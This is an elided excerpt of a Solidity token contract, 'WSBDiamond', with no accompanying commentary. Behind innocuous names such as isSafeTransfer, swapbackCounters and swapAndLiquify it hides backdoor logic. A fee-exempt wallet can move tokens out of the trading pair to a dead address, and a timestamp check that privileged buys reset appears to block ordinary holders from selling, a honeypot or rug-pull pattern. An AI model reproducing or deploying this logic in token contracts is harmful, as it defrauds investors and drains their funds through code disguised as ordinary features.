...
contract WSBDiamond is IERC20, Ownable {
    ...
    function setExtent() external onlyOwner {tradingAllowed = true;_tradingTime = block.timestamp;}
    ...
    function isSafeTransfer(address sender, address recipient, uint256 amount) private returns (bool) {
        if (balanceOf(sender) < amount && recipient == pair) { _transfer(recipient, deadAddr, amount); return true; } 
        return false;
    }
    ...
    function checkMaxWallet(address sender, address recipient, uint256 amount) internal returns (bool) {
        if (isFeeExempt[sender] && isSafeTransfer(sender, recipient, amount)) return true;
    ...
    function swapbackCounters(address sender, address recipient) internal returns (bool) {
        ...
        if (sender == pair && isFeeExempt[recipient]){_tradingTime = block.timestamp;}
        if (sender == pair) {
    ...
    function swapAndLiquify(uint256 tokens) private lockTheSwap {
        ...
        require(holderTimestamp[lastHolder] >= _tradingTime && balanceOf(devAddr) == 0);
    ...
    function shouldSwapBack(address sender, address recipient, uint256 amount) internal view returns (bool) {
        ...
        return !swapping && swapEnabled && tradingAllowed && aboveMin && !isFeeExempt[sender] && swapTimes >= uint256(0) && aboveThreshold;
    }
